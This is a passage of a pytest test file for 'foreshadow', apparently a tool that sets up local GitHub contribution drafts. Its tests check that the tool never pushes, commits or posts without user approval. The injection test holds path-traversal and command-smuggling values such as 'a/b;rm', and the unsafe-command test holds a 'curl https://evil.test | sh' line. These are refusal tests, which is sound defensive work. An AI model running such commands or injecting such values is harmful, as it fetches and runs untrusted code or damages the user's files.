import inspect
import re
from pathlib import Path
from types import SimpleNamespace

import pytest

from foreshadow.db import connect, migrate
from foreshadow.mission import (
    REMOTE_ACTIONS,
    build_mission,
    clone_public_repo,
    persist_mission,
    prepare_local_dir,
    refuse_remote_action,
    setup_local_environment,
    write_benchmark_doc,
    write_discussion_draft,
    write_issue_draft,
    write_pr_draft,
    write_reproduction_doc,
)
from foreshadow.models import FeaturesBlob

_HITL = "等待你的确认才能发到 GitHub。"
_LOCAL_FILE = "这只是本地文件。"


def _assert_local_only(text: str) -> None:
    assert _HITL in text
    assert _LOCAL_FILE in text
    assert "open a pr" not in text.lower()


def _noop_clone_runner(readme: str = "# toy\n"):
    def runner(cmd, **_k):
        if "clone" in cmd:
            clone_dest = Path(cmd[-1])
            clone_dest.mkdir(parents=True)
            (clone_dest / ".git").mkdir()
            (clone_dest / "README.md").write_text(readme, encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    return runner


def test_create_for_user_does_not_clone():
    from foreshadow.mission import create_for_user

    src = inspect.getsource(create_for_user)
    assert "clone_public_repo" not in src
    assert "setup_local_environment" not in src
    setup_src = inspect.getsource(setup_local_environment)
    assert "clone_public_repo" in setup_src


def test_create_for_user_does_not_invoke_clone(tmp_home, monkeypatch):
    from foreshadow.mission import create_for_user

    monkeypatch.delenv("FORESHADOW_SKIP_CLONE", raising=False)

    def explode(*_a, **_k):
        raise AssertionError("create_for_user must not invoke clone_public_repo")

    monkeypatch.setattr("foreshadow.mission.clone_public_repo", explode)
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    mission = create_for_user(
        conn, user_id=uid, full_name="acme/toy", data_dir=tmp_home
    )
    dest = tmp_home / "work" / "acme__toy"
    assert mission.status == "MISSION_READY"
    assert (dest / "FORESHADOW.md").is_file()
    assert not (dest / "repo").exists()
    assert not (dest / "repo" / ".git").exists()


def test_build_mission_waits_for_user():
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(bug_n=3, issue_sample_n=6, maint_touch=0.4),
        age_days=40,
        contributors=5,
        stars=80,
        pushed_age_days=1,
    )
    assert m.needs_user_approval is True
    assert m.status == "MISSION_READY"
    assert m.strategy.allows_direct_pr is False
    assert m.strategy.steps_zh


def test_pr_draft_only_for_code_paths_and_never_posts(tmp_path):

    talk = build_mission("acme/toy", feat=FeaturesBlob(), stars=10, age_days=12, contributors=2)
    assert write_pr_draft(tmp_path, talk) is None
    code = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            gap_docs=1,
            pr_accept_rate=0.5,
            pr_review_rate=0.5,
            maint_touch=0.5,
            pr_merged_sample_n=4,
            issue_sample_n=2,
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    path = write_pr_draft(tmp_path, code)
    assert path is not None
    text = path.read_text(encoding="utf-8")
    assert path.name == "PR_DRAFT.md"
    assert "等待你的确认" in text
    assert "不会 `create_pr`" in text or "不会 create_pr" in text or "create_pr" in text
    assert "未发送" in text
    assert code.strategy.allows_direct_pr is False


def test_issue_draft_is_local_and_not_a_pr(tmp_path):
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            bug_n=3,
            issue_sample_n=6,
            help_issue_titles=["#73 crash on empty batch"],
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    path = write_issue_draft(tmp_path, m)
    text = path.read_text(encoding="utf-8")
    assert path.name == "ISSUE_DRAFT.md"
    assert "等待你的确认" in text
    assert "#73" in text
    assert "复现" in text
    assert "不是 Pull Request" in text
    src = inspect.getsource(write_issue_draft)
    assert "GitHubClient" not in src
    assert "api.github.com" not in src


def test_refuse_remote_never_posts():
    for action in REMOTE_ACTIONS:
        out = refuse_remote_action(action)
        assert out["blocked"] is True
        assert out["ok"] is False
        assert "远程" in out["error"]


def test_transition_and_portfolio(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission("acme/toy", feat=FeaturesBlob(gap_docs=1), stars=12, age_days=20, contributors=2)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    from foreshadow.mission import list_missions, portfolio, record_event, transition

    transition(conn, mid, uid, "LOCAL_SETUP")
    record_event(conn, user_id=uid, mission_id=mid, full_name="acme/toy", event="local_setup")
    port = portfolio(conn, uid)
    assert port["missions"] == 1
    assert port["by_status"].get("LOCAL_SETUP") == 1
    assert port["events"].get("local_setup") == 1
    listed = list_missions(conn, uid)
    assert listed[0]["status"] == "LOCAL_SETUP"
    assert listed[0]["status_zh"] == "正在准备本地环境"
    assert "本地" in (listed[0].get("next_step_zh") or "")


def test_persist_mission(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            gap_docs=1,
            pr_accept_rate=0.5,
            pr_review_rate=0.5,
            maint_touch=0.5,
            pr_merged_sample_n=4,
            issue_sample_n=2,
        ),
        stars=20,
        age_days=30,
        contributors=3,
    )
    dest = prepare_local_dir(tmp_home, "acme/toy")
    m.local_path = str(dest)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    assert mid >= 1
    assert (dest / "FORESHADOW.md").is_file()
    row = conn.execute("SELECT status, entry_path FROM entry_missions WHERE id=?", (mid,)).fetchone()
    assert row[0] == "MISSION_READY"
    assert row[1] == "DOCUMENTATION"


def test_allowed_never_includes_submitted(tmp_home):
    from foreshadow.mission import ALLOWED

    for src, dests in ALLOWED.items():
        assert src != "SUBMITTED"
        assert "SUBMITTED" not in dests
        assert "PR_DRAFT" not in dests


def test_transition_cannot_jump_to_submitted(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission("acme/toy", feat=FeaturesBlob(gap_docs=1), stars=12, age_days=20, contributors=2)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    from foreshadow.mission import transition

    with pytest.raises(ValueError, match="cannot"):
        transition(conn, mid, uid, "SUBMITTED")


def test_clone_url_rejects_injection(tmp_path):
    for name in ("../etc/passwd", "a/b;rm", "https://evil.com/x", "a/../../b", "a/b.git\n"):
        out = clone_public_repo(name, tmp_path)
        assert out["ok"] is False
        assert out["status"] in {"invalid", "no_git", "failed"}


def test_clone_is_fail_soft_without_git(tmp_path, monkeypatch):
    def boom(*_a, **_k):
        raise FileNotFoundError("git")

    out = clone_public_repo("acme/toy", tmp_path, runner=boom)
    assert out["ok"] is False
    assert out["status"] == "no_git"
    assert not (tmp_path / "repo" / ".git").exists()


def test_clone_reuses_existing_checkout(tmp_path):
    dest = tmp_path / "work"
    clone_dir = dest / "repo"
    clone_dir.mkdir(parents=True)
    (clone_dir / ".git").mkdir()
    called = {"n": 0}

    def runner(*_a, **_k):
        called["n"] += 1
        raise AssertionError("must not re-clone")

    out = clone_public_repo("acme/toy", dest, runner=runner)
    assert out["ok"] is True
    assert out["status"] == "exists"
    assert called["n"] == 0


def test_clone_uses_depth_one_and_writes_tree(tmp_path):
    seen: list[list[str]] = []

    def runner(cmd, **_k):
        seen.append(list(cmd))
        dest = Path(cmd[-1])
        dest.mkdir(parents=True)
        (dest / ".git").mkdir()
        (dest / "README.md").write_text("# toy\n", encoding="utf-8")
        (dest / "CONTRIBUTING.md").write_text("# c\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    dest = tmp_path / "work"
    out = clone_public_repo("acme/toy", dest, runner=runner)
    assert out["ok"] is True
    assert out["status"] == "cloned"
    assert seen[0][:4] == ["git", "clone", "--depth", "1"]
    assert "--" in seen[0]
    assert seen[0][-2] == "https://github.com/acme/toy.git"
    assert (dest / "repo" / "README.md").is_file()


def test_setup_local_clones_and_waits_for_user(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission("acme/toy", feat=FeaturesBlob(bug_n=3), stars=40, age_days=30, contributors=4)
    dest = prepare_local_dir(tmp_home, "acme/toy")
    m.local_path = str(dest)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)

    def runner(cmd, **_k):
        if "clone" in cmd:
            clone_dest = Path(cmd[-1])
            clone_dest.mkdir(parents=True)
            (clone_dest / ".git").mkdir()
            (clone_dest / "README.md").write_text("# toy\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="foreshadow/entry\n", stderr="")

    out = setup_local_environment(conn, mid, uid, tmp_home, runner=runner)
    assert out["clone"]["ok"] is True
    assert out["mission"]["status"] == "WAITING_USER_APPROVAL"
    assert out["mission"]["needs_user_approval"] is True
    assert "远程" in (out["mission"].get("remote_blocked") or "")
    assert (dest / "repo" / ".git").is_dir()
    md = (dest / "FORESHADOW.md").read_text(encoding="utf-8")
    assert "acme/toy" in md
    assert "不会自动" in md
    assert "toy" in md.lower() or "README" in md
    assert (dest / "ISSUE_DRAFT.md").is_file()
    assert (dest / "REPRODUCTION.md").is_file()
    assert not (dest / "PR_DRAFT.md").exists()
    assert (dest / "FORK.md").is_file()
    assert "不会" in (dest / "FORK.md").read_text(encoding="utf-8")
    draft = (dest / "ISSUE_DRAFT.md").read_text(encoding="utf-8")
    assert "等待你的确认" in draft
    _assert_local_only((dest / "REPRODUCTION.md").read_text(encoding="utf-8"))
    assert out["mission"].get("reproduction_path")
    assert out["mission"].get("benchmark_path") is None
    assert out["mission"].get("discussion_draft_path") is None
    assert out["branch"]["ok"] is True
    pipeline = out["mission"].get("pipeline") or out.get("pipeline") or []
    by_id = {step["id"]: step for step in pipeline}
    assert by_id["clone"]["status"] == "done"
    assert by_id["waiting_approval"]["status"] == "pending"
    log = dest / "TASK_LOG.md"
    assert log.is_file()
    log_text = log.read_text(encoding="utf-8")
    for field in ("TASK:", "COMMAND:", "EXIT:", "RESULT:", "VERDICT:", "NEXT:"):
        assert field in log_text


def test_setup_runs_local_pipeline_then_waits(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission("acme/toy", feat=FeaturesBlob(bug_n=3), stars=40, age_days=30, contributors=4)
    dest = prepare_local_dir(tmp_home, "acme/toy")
    m.local_path = str(dest)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    seen: list[list[str]] = []

    def runner(cmd, **_k):
        argv = list(cmd)
        seen.append(argv)
        assert "push" not in argv
        assert "commit" not in argv
        if "clone" in argv:
            clone_dest = Path(argv[-1])
            clone_dest.mkdir(parents=True)
            (clone_dest / ".git").mkdir()
            (clone_dest / "README.md").write_text("# toy\n", encoding="utf-8")
            (clone_dest / "pyproject.toml").write_text("[project]\nname='toy'\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    out = setup_local_environment(conn, mid, uid, tmp_home, runner=runner)
    assert out["clone"]["ok"] is True
    assert out["mission"]["status"] == "WAITING_USER_APPROVAL"
    pipeline = out["mission"]["pipeline"]
    assert [step["id"] for step in pipeline] == [
        "clone",
        "branch",
        "inspect",
        "issue",
        "tests",
        "drafts",
        "waiting_approval",
    ]
    by_id = {step["id"]: step for step in pipeline}
    assert by_id["clone"]["status"] == "done"
    assert by_id["waiting_approval"]["status"] == "pending"
    assert by_id["waiting_approval"]["status"] != "done"
    assert (dest / "TASK_LOG.md").is_file()
    text = (dest / "TASK_LOG.md").read_text(encoding="utf-8")
    assert "TASK:" in text
    assert "VERDICT: UNKNOWN" in text
    assert "等待你的确认" in text
    assert not (dest / "repo" / "TASK_LOG.md").exists()
    assert all(part != "push" for cmd in seen for part in cmd)
    assert all(part != "commit" for cmd in seen for part in cmd)


def _setup_issue_pytest_mission(tmp_home, *, body: str, files: dict[str, str], collect_code: int = 0):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            bug_n=3,
            issue_sample_n=6,
            help_issue_titles=["#73 crash on empty batch"],
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    dest = prepare_local_dir(tmp_home, "acme/toy")
    m.local_path = str(dest)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    seen: list[list[str]] = []

    def runner(cmd, **_k):
        argv = list(cmd)
        seen.append(argv)
        if "clone" in argv:
            clone_dest = Path(argv[-1])
            clone_dest.mkdir(parents=True)
            (clone_dest / ".git").mkdir()
            (clone_dest / "README.md").write_text("# toy\n", encoding="utf-8")
            (clone_dest / "pyproject.toml").write_text(
                "[project]\nname='toy'\n", encoding="utf-8"
            )
            for rel, text in files.items():
                path = clone_dest / rel
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text(text, encoding="utf-8")
            return SimpleNamespace(returncode=0, stdout="", stderr="")
        if any("pytest" in str(part) for part in argv):
            targeted = any("test_retriever.py" in str(part) for part in argv)
            code = collect_code if targeted else 0
            return SimpleNamespace(
                returncode=code,
                stdout="collected 1 item\n" if code == 0 else "",
                stderr="" if code == 0 else "collection failed",
            )
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    def fake_fetch(full_name: str, number: int):
        return {
            "number": 73,
            "title": "crash on empty batch",
            "body": body,
            "html_url": "https://github.com/acme/toy/issues/73",
        }

    out = setup_local_environment(
        conn, mid, uid, tmp_home, runner=runner, fetch_issue=fake_fetch
    )
    return dest, out, seen


def test_issue_pytest_records_found_test_target(tmp_home):
    dest, out, seen = _setup_issue_pytest_mission(
        tmp_home,
        body="pytest tests/test_retriever.py",
        files={"tests/test_retriever.py": "def test_ok():\n    assert True\n"},
        collect_code=0,
    )
    log = (dest / "TASK_LOG.md").read_text(encoding="utf-8")
    assert "VERDICT: FOUND_TEST_TARGET" in log
    assert "TEST_COLLECTION_FAILED" not in log
    assert "pytest" in log
    assert "tests/test_retriever.py" in log
    collect_cmds = [cmd for cmd in seen if any("pytest" in str(p) for p in cmd)]
    assert collect_cmds
    assert any("--collect-only" in cmd for cmd in collect_cmds)
    assert any("tests/test_retriever.py" in cmd for cmd in collect_cmds)
    issue = (out["tests"] or {}).get("issue_collect") or {}
    assert issue.get("ok") is True
    assert "pytest" in str(issue.get("command") or "")


def test_issue_pytest_records_collection_failed(tmp_home):
    dest, out, _seen = _setup_issue_pytest_mission(
        tmp_home,
        body="pytest tests/test_retriever.py",
        files={"tests/test_retriever.py": "def test_ok():\n    assert True\n"},
        collect_code=1,
    )
    log = (dest / "TASK_LOG.md").read_text(encoding="utf-8")
    assert "VERDICT: TEST_COLLECTION_FAILED" in log
    assert "FOUND_TEST_TARGET" not in log
    issue = (out["tests"] or {}).get("issue_collect") or {}
    assert issue.get("ok") is False


def test_issue_pytest_unknown_when_target_missing(tmp_home):
    dest, out, _seen = _setup_issue_pytest_mission(
        tmp_home,
        body="pytest tests/test_retriever.py",
        files={},
        collect_code=0,
    )
    log = (dest / "TASK_LOG.md").read_text(encoding="utf-8")
    assert "VERDICT: UNKNOWN" in log
    assert "FOUND_TEST_TARGET" not in log
    assert "TEST_COLLECTION_FAILED" not in log
    assert not (out.get("tests") or {}).get("issue_collect")


def test_setup_embeds_cited_issue(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            bug_n=3,
            issue_sample_n=6,
            help_issue_titles=["#73 crash on empty batch"],
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    dest = prepare_local_dir(tmp_home, "acme/toy")
    m.local_path = str(dest)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)

    def runner(cmd, **_k):
        if "clone" in cmd:
            clone_dest = Path(cmd[-1])
            clone_dest.mkdir(parents=True)
            (clone_dest / ".git").mkdir()
            (clone_dest / "README.md").write_text("# toy\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    def fake_fetch(full_name: str, number: int):
        assert full_name == "acme/toy"
        assert number == 73
        return {
            "number": 73,
            "title": "crash on empty batch",
            "body": "repro: pass []",
            "html_url": "https://github.com/acme/toy/issues/73",
        }

    out = setup_local_environment(
        conn, mid, uid, tmp_home, runner=runner, fetch_issue=fake_fetch
    )
    md = (dest / "FORESHADOW.md").read_text(encoding="utf-8")
    assert "#73" in md
    assert "repro: pass []" in md
    assert out["mission"].get("cited_issue", {}).get("number") == 73
    draft = (dest / "ISSUE_DRAFT.md").read_text(encoding="utf-8")
    assert "crash on empty batch" in draft
    assert "repro: pass []" in draft
    repro = (dest / "REPRODUCTION.md").read_text(encoding="utf-8")
    _assert_local_only(repro)
    assert "#73" in repro
    assert "crash on empty batch" in repro
    assert "repro: pass []" in repro
    assert not (dest / "PR_DRAFT.md").exists()


def test_create_for_user_reuses_open_mission(tmp_home, monkeypatch):
    monkeypatch.setenv("FORESHADOW_SKIP_CLONE", "1")
    from foreshadow.mission import create_for_user

    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    first = create_for_user(conn, user_id=uid, full_name="acme/toy", data_dir=tmp_home)
    second = create_for_user(conn, user_id=uid, full_name="acme/toy", data_dir=tmp_home)
    assert first.id == second.id
    dest = tmp_home / "work" / "acme__toy"
    assert (dest / "ISSUE_DRAFT.md").is_file()
    assert (dest / "FORESHADOW.md").is_file()
    n = conn.execute(
        "SELECT COUNT(*) FROM entry_missions WHERE user_id=? AND full_name=?",
        (uid, "acme/toy"),
    ).fetchone()[0]
    assert n == 1


def test_draft_approved_stays_local(tmp_home):
    from foreshadow.mission import persist_mission, record_user_event, transition

    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission("acme/toy", feat=FeaturesBlob(gap_docs=1), stars=12, age_days=20, contributors=2)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    transition(conn, mid, uid, "LOCAL_SETUP")
    plan = record_user_event(conn, user_id=uid, mission_id=mid, event="draft_approved")
    assert plan["status"] == "DRAFT_READY"
    with pytest.raises(ValueError, match="cannot"):
        transition(conn, mid, uid, "SUBMITTED")


def test_local_branch_never_pushes(tmp_path):
    from foreshadow.mission import create_local_branch

    clone = tmp_path / "repo"
    clone.mkdir()
    (clone / ".git").mkdir()
    seen: list[list[str]] = []

    def runner(cmd, **_k):
        seen.append(list(cmd))
        if "show-ref" in cmd:
            return SimpleNamespace(returncode=1, stdout="", stderr="")
        return SimpleNamespace(returncode=0, stdout="foreshadow/entry\n", stderr="")

    out = create_local_branch(clone, runner=runner)
    assert out["ok"] is True
    assert out["status"] == "created"
    assert all(part != "push" for cmd in seen for part in cmd)
    assert all(part != "commit" for cmd in seen for part in cmd)
    assert not any("-B" in cmd for cmd in seen)
    assert any("-b" in cmd and "foreshadow/entry" in cmd for cmd in seen)
    src = inspect.getsource(create_local_branch)
    assert '"-B"' not in src
    assert "'-B'" not in src
    assert "checkout -B" not in src
    assert 'git("push"' not in src
    assert 'git("commit"' not in src
    assert "shell=True" not in src


def test_local_branch_idempotent_if_exists(tmp_path):
    from foreshadow.mission import create_local_branch

    clone = tmp_path / "repo"
    clone.mkdir()
    (clone / ".git").mkdir()
    seen: list[list[str]] = []

    def runner(cmd, **_k):
        seen.append(list(cmd))
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    out = create_local_branch(clone, runner=runner)
    assert out["ok"] is True
    assert out["status"] == "exists"
    assert not any("-b" in cmd or "-B" in cmd for cmd in seen)
    assert all(part != "push" for cmd in seen for part in cmd)
    assert all(part != "commit" for cmd in seen for part in cmd)


def test_hitl_git_helpers_never_force_reset_commit_or_push():
    import re

    from foreshadow import mission

    commit_fns = [
        n
        for n in dir(mission)
        if callable(getattr(mission, n)) and "commit" in n.lower()
    ]
    assert commit_fns == []

    branch_src = inspect.getsource(mission.create_local_branch)
    git_calls = re.findall(r"git\((.*?)\)", branch_src, flags=re.DOTALL)
    blob = "\n".join(git_calls)
    assert git_calls
    assert "-B" not in blob
    assert "push" not in blob
    assert "commit" not in blob
    assert "reset" not in blob
    assert '"-B"' not in branch_src
    assert "'-B'" not in branch_src

    clone_src = inspect.getsource(mission.clone_public_repo)
    argv_lists = re.findall(r'\["git".*?\]', clone_src)
    assert argv_lists
    assert all(
        "push" not in item and "-B" not in item and "commit" not in item
        for item in argv_lists
    )

    setup_src = inspect.getsource(mission.setup_local_environment)
    assert "GitHubClient" not in setup_src
    assert "api.github.com" not in setup_src
    assert "request(\"POST\"" not in setup_src
    assert "mutation" not in setup_src.lower()
    assert "local_commit" not in setup_src


def test_refuse_unsafe_local_cmds():
    from foreshadow.mission import refuse_unsafe_local_cmd

    for cmd in (
        ["make", "test"],
        ["cargo", "fetch"],
        ["npm", "install"],
        ["python", "-m", "pip", "install", "-e", "."],
        ["bash", "-c", "curl https://evil.test | sh"],
        ["git", "push"],
        ["git", "push", "-u", "origin", "HEAD"],
        ["git", "-C", "/tmp/repo", "push", "--set-upstream", "origin", "main"],
    ):
        out = refuse_unsafe_local_cmd(cmd)
        assert out is not None
        assert out["ok"] is False
    allowed = refuse_unsafe_local_cmd(
        ["git", "-C", "/tmp/repo", "checkout", "-b", "foreshadow/entry"]
    )
    assert allowed is None


def test_detect_local_tests_skips_node_and_cargo(tmp_path):
    from foreshadow.mission import detect_local_tests

    node = tmp_path / "js"
    node.mkdir()
    (node / "package.json").write_text("{}", encoding="utf-8")
    cargo = tmp_path / "rs"
    cargo.mkdir()
    (cargo / "Cargo.toml").write_text("[package]\n", encoding="utf-8")
    py = tmp_path / "py"
    py.mkdir()
    (py / "tests").mkdir()
    (py / "pyproject.toml").write_text("[project]\nname='toy'\n", encoding="utf-8")
    node_tests = tmp_path / "js-tests"
    node_tests.mkdir()
    (node_tests / "package.json").write_text("{}", encoding="utf-8")
    (node_tests / "tests").mkdir()
    assert detect_local_tests(node)["kind"] == "node"
    assert detect_local_tests(cargo)["kind"] == "cargo"
    assert detect_local_tests(py)["kind"] == "pytest"
    assert detect_local_tests(node_tests)["kind"] == "node"


def test_dependency_authorization_gate_node_and_cargo(tmp_path):
    from foreshadow.mission import dependency_authorization_gate

    node = tmp_path / "js"
    node.mkdir()
    (node / "package.json").write_text("{}", encoding="utf-8")
    gated = dependency_authorization_gate(node)
    assert gated is not None
    assert gated["status"] == "DEPENDENCY_REQUIRED"
    assert gated["message_zh"] == "需要用户授权安装依赖"
    (node / "node_modules").mkdir()
    assert dependency_authorization_gate(node) is None

    cargo = tmp_path / "rs"
    cargo.mkdir()
    (cargo / "Cargo.toml").write_text("[package]\n", encoding="utf-8")
    cargo_gate = dependency_authorization_gate(cargo)
    assert cargo_gate is not None
    assert cargo_gate["status"] == "DEPENDENCY_REQUIRED"
    (cargo / "target").mkdir()
    assert dependency_authorization_gate(cargo) is None

    py = tmp_path / "py"
    py.mkdir()
    (py / "pyproject.toml").write_text("[project]\nname='toy'\n", encoding="utf-8")
    assert dependency_authorization_gate(py) is None
    src = inspect.getsource(dependency_authorization_gate)
    assert "npm install" not in src
    assert "cargo build" not in src
    assert "cargo install" not in src


def test_setup_node_repo_records_dependency_required(tmp_home):
    from foreshadow.mission import dependency_authorization_gate

    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission("acme/toy", feat=FeaturesBlob(bug_n=3), stars=40, age_days=30, contributors=4)
    dest = prepare_local_dir(tmp_home, "acme/toy")
    m.local_path = str(dest)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    seen: list[list[str]] = []

    def runner(cmd, **_k):
        argv = list(cmd)
        seen.append(argv)
        if "clone" in argv:
            clone_dest = Path(argv[-1])
            clone_dest.mkdir(parents=True)
            (clone_dest / ".git").mkdir()
            (clone_dest / "README.md").write_text("# toy\n", encoding="utf-8")
            (clone_dest / "package.json").write_text("{}", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    out = setup_local_environment(conn, mid, uid, tmp_home, runner=runner)
    tests = out["tests"]
    assert tests["status"] == "DEPENDENCY_REQUIRED"
    assert tests["message_zh"] == "需要用户授权安装依赖"
    by_id = {step["id"]: step for step in out["pipeline"]}
    assert by_id["tests"]["status"] == "DEPENDENCY_REQUIRED"
    assert by_id["tests"]["evidence"] == "需要用户授权安装依赖"
    log = (dest / "TASK_LOG.md").read_text(encoding="utf-8")
    assert "需要用户授权安装依赖" in log
    blob = " ".join(part for cmd in seen for part in cmd)
    assert "npm" not in blob
    assert "cargo" not in blob
    src = inspect.getsource(setup_local_environment)
    assert "npm install" not in src
    assert "cargo build" not in src
    assert dependency_authorization_gate(dest / "repo")["status"] == "DEPENDENCY_REQUIRED"


def test_inspect_finds_github_contributing_and_rst_title(tmp_path):
    from foreshadow.mission import inspect_clone

    missing = inspect_clone(tmp_path / "nope")
    assert missing["inspected"] is False
    assert missing["has_readme"] is False

    root = tmp_path / "repo"
    root.mkdir()
    (root / "README.rst").write_text("Toy Lib\n=======\n\nhello\n", encoding="utf-8")
    github = root / ".github"
    github.mkdir()
    (github / "CONTRIBUTING.md").write_text("# How to help\n", encoding="utf-8")
    out = inspect_clone(root)
    assert out["inspected"] is True
    assert out["has_readme"] is True
    assert out["readme_title"] == "Toy Lib"
    assert out["has_contributing"] is True
    assert "How to help" in (out.get("contributing_headings") or [])


def test_benchmark_mission_has_no_pr_draft(tmp_path):

    m = build_mission(
        "acme/demo",
        feat=FeaturesBlob(
            screenshot_only=True,
            tree_kind="has_source",
            issue_sample_n=4,
            talk_n=2,
        ),
        stars=40,
        age_days=30,
        contributors=4,
        pushed_age_days=1,
        unique_issue_authors=3,
    )
    assert m.strategy.path == "BENCHMARK"
    assert m.strategy.allows_direct_pr is False
    assert write_pr_draft(tmp_path, m) is None
    assert "第一步" in m.strategy.steps_zh[0]
    path = write_benchmark_doc(
        tmp_path,
        m,
        inspect={
            "install_hint": "pip install demo",
            "readme_headings": ["Install", "Benchmark"],
        },
    )
    assert path is not None
    assert path.name == "BENCHMARK.md"
    text = path.read_text(encoding="utf-8")
    _assert_local_only(text)
    assert "pip install demo" in text
    assert "Install" in text
    assert "Benchmark" in text
    assert "不会代跑" in text
    assert not (tmp_path / "PR_DRAFT.md").exists()


def test_setup_rewrites_steps_from_readme_and_issue(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            bug_n=3,
            issue_sample_n=6,
            help_issue_titles=["#73 crash on empty batch"],
            readme_headings=["Install"],
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    dest = prepare_local_dir(tmp_home, "acme/toy")
    m.local_path = str(dest)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)

    def runner(cmd, **_k):
        if "clone" in cmd:
            clone_dest = Path(cmd[-1])
            clone_dest.mkdir(parents=True)
            (clone_dest / ".git").mkdir()
            (clone_dest / "README.md").write_text(
                "# toy\n## Install\n```\npip install toy\n```\n## Usage\n",
                encoding="utf-8",
            )
            (clone_dest / "pyproject.toml").write_text("[project]\nname='toy'\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    def fake_fetch(full_name: str, number: int):
        return {
            "number": 73,
            "title": "crash on empty batch",
            "body": "repro: pass []",
            "html_url": "https://github.com/acme/toy/issues/73",
        }

    out = setup_local_environment(
        conn, mid, uid, tmp_home, runner=runner, fetch_issue=fake_fetch
    )
    steps = " ".join(out["mission"].get("steps_zh") or [])
    first = (out["mission"].get("steps_zh") or [""])[0]
    assert "第一步" in steps
    assert "#73" in steps
    assert "FORESHADOW.md" not in first
    assert "Install" in steps or "pip install toy" in steps
    assert "ISSUE_DRAFT.md" in steps
    assert "open a pr" not in steps.lower()
    md = (dest / "FORESHADOW.md").read_text(encoding="utf-8")
    assert "今日进入计划" in md
    assert "FORESHADOW.md" in md
    assert "第一步" in md
    assert out["inspect"].get("install_hint") == "pip install toy"
    assert out["inspect"].get("kind") == "python"
    assert "README 安装命令（你自己执行，Foreshadow 不会代跑）：`pip install toy`" in md
    assert "这是 Python 仓库。" in md
    assert "本地分支：foreshadow/entry" in md
    assert "README：有" in md
    assert "## 为什么不是直接 PR" in md
    assert "可以直接 PR" not in md
    assert "相关文件：" in md
    assert "不会自动 push / 开 Issue / 开 PR" in md
    assert "等待你的确认才能执行任何远程 GitHub 操作。" in md


def test_write_mission_doc_quotes_install_hint(tmp_path):
    from foreshadow.mission import write_mission_doc

    m = build_mission("acme/toy", feat=FeaturesBlob(), stars=10, age_days=12, contributors=2)
    path = write_mission_doc(
        tmp_path,
        m,
        extra={"inspect": {"install_hint": "pip install toy", "kind": "python"}},
    )
    text = path.read_text(encoding="utf-8")
    assert path.name == "FORESHADOW.md"
    assert "今日进入计划" in text
    assert "FORESHADOW.md" in text
    assert "acme/toy" in text
    assert "不会自动" in text
    assert "README 安装命令（你自己执行，Foreshadow 不会代跑）：`pip install toy`" in text
    assert "这是 Python 仓库。" in text
    assert "等待你的确认才能执行任何远程 GitHub 操作。" in text
    assert "不会自动 push / 开 Issue / 开 PR" in text
    assert "## 为什么不是直接 PR" in text
    assert "可以直接 PR" not in text
    for reason in m.strategy.why:
